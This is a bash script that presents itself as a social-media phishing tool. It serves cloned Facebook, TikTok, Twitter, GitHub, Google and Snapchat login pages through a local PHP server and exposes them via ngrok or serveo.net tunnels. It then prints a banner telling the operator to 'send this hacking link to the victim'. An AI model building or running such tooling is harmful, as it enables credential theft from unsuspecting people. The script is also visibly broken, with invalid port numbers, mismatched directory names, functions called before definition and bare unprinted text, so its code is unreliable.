#!/bin/bash
## Coded : by Prince Gutierrez
## Github : https://github.com/PDGHACK-10
## Version : 1.0.2
## about this tool : SOCIAL MEDIA PHISHING TOOL
## YOUTUBE CHANNEL : PDGHACK-12
blue='\033[31;1m'
red='\033[32;1m'
green='\033[33;1m'
white='\033[34;1m'

dependencies() {

command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v figlet > /dev/null 2>&1 || { echo >&2 "I require figlet but it's not installed. Install it. Aborting."; exit 1; }
 

}





tools() {

figlet SMPHISHER
echo -e $red $=================================$
echo -e $red $    CODED BY PRINCE GUTIERREZ    $
echo -e $red $=================================$
echo -e $red ==================================
echo -e $red % "[01]    FACEBOOK"              %
echo -e $red % "[02]    TIKTOK"                %
echo -e $red % "[03]    TWITTER"               %
echo -e $red % "[04]    GITHUB"                %
echo -e $red % "[05]    GOOGLE"                %
echo -e $red % "[06]    SNAPCHAT"               %
echo -e $red ==================================                              
read -p $red "ENTER SOCIAL MEDIA TO HACK " hug

if [[ $hug == 1 || $hug == 01 ]]; then
cd TOOLS && bash tools.sh

elif [[ $hug == 2 || $hug == 02 ]]; then
cd TOOLS && bash tools.sh

elif [[ $hug == 3 || $hug == 03 ]]; then
cd TOOLS && bash tools.sh

elif [[ $hug == 4 || $hug == 04 ]]; then
cd TOOLS && bash tools.sh

elif [[ $hug == 5 || $hug == 05 ]]; then
cd TOOLS && bash tools.sh

elif [[ $hug == 6 || $hug == 06 ]]; then
cd TOOLS && bash tools.sh
fi

}

tunnel_menu() {

if [[ -e .sp ]]; then
rm -rf .sp
fi

if [[ -d .htr/www ]]; then
rm -rf .pd/www
mkdir .pd/www
else
mkdir .pd/www
fi

cp -rf sites/$website/* .pd/www
cp -f sites/ip.php .pd/www/

def_tunnel_menu="2"
figlet SMPHISHER
echo -e $red "[01] NGROK.IO "
echo -e $red "[02] SERVEO "
read -p "SELECT OPTION " tunnel_menu

if [[ $tunnel_menu == 1 || $tunnel_menu == 01 ]]; then
start_ngrok
elif [[ $tunnel_menu == 2 || $tunnel_menu == 02 ]]; then
start_serveo

else
echo -e $red INVALID OPTION TRY AGAIN
sleep 1
menu
fi

start_ngrok() {

echo -e $red Reading now... http://127.0.0.1:972742
sleep 2
echo -e $red Ngrok Launching Up ...
cd pd/www && php -S http://127.0.0.1:972742 > /dev/null 2>&1 & 
sleep 2
./pd/ngrok http http://127.0.0.1:972742 > /dev/null 2>&1 &
sleep 7
ngrok_link=$(curl -s -N http://127.0.0.1:972742/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")

figlet SMPHISHER
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
% SEND THIS HACKING LINK TO THE VICTIM👇👇👇👇👇 % 
% LINK $ngrok_link                               %
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

datafound
}

start_serveo() {

serveo_default_choose_sub="Y"
serveo_default_sub="$website$RANDOM"
serveo_def_port="5555"

echo -e $red Select a Port $red Default : $serveo_def_port
read serveo_port
serveo_port="${serveo_port:-${serveo_def_port}}"
sleep 1
echo -e $red Generate Custom Link ? Y :
read serveo_choose_sub
serveo_choose_sub="${serveo_choose_sub:-${serveo_default_choose_sub}}"
if [[ $serveo_choose_sub == "Y" || $serveo_choose_sub == "y" || $serveo_choose_sub == "Yes" || $serveo_choose_sub == "yes" ]]; then
serveo_custom_subdomain=true
sleep 1
echo -e $red Input CUSTOM Subdomain : $redDefault: $red: $serveo_default_sub
read serveo_subdomain
serveo_subdomain="${serveo_subdomain:-${serveo_default_sub}}"
sleep 1
fi

echo -e $res Starting.....http://127.0.0.1:$serveo_port
sleep 1
echo -e $red Launching Up Serveo ...
cd pd/www && php -S 127.0.0.1:$serveo_port > /dev/null 2>&1 & 
if [[ $serveo_custom_subdomain == true ]]; then
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=60 -R %s:80:localhost:%s serveo.net > .nexlink 2> /dev/null &' $serveo_subdomain,$serveo_port
sleep 7

else
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:%s serveo.net > .nexlink 2> /dev/null &' $serveo_port
sleep 7
fi
serveo_link=$(grep -o '.\{0,0\}http.\{0,100\}' sp)
figlet SMPHISHER
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
% SEND THIS HACKING LINK TO THE VICTIM👇👇👇👇👇 % 
% LINK $serveo_link                              %
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
